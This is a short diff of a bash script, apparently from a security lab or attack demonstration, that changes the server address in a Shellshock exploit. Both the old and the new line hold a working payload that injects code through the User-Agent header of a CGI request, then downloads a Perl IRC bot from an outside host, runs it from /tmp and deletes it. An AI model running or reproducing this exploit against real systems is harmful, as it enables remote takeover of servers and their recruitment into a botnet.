@@ -14,4 +14,4 @@ if ! [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
 fi
 
 # create vulnerable.lan & replace IP with that name
-curl 'http://'$ip'/cgi-bin/shell.sh' -H "User-Agent: () { :;}; /usr/bin/perl -e 'print \"Content-Type: text/plain\r\n\r\nATTACK SUCCESS\n\"; system(\"/usr/bin/curl http://10.0.51.100/akheros-irc-bot.pl -o /tmp/core; perl /tmp/core; rm /tmp/core;\");'"
+curl 'http://'$ip'/cgi-bin/shell.sh' -H "User-Agent: () { :;}; /usr/bin/perl -e 'print \"Content-Type: text/plain\r\n\r\nATTACK SUCCESS\n\"; system(\"/usr/bin/curl http://192.168.51.5/attacker1-irc-bot.pl -o /tmp/core; perl /tmp/core; rm /tmp/core;\");'"
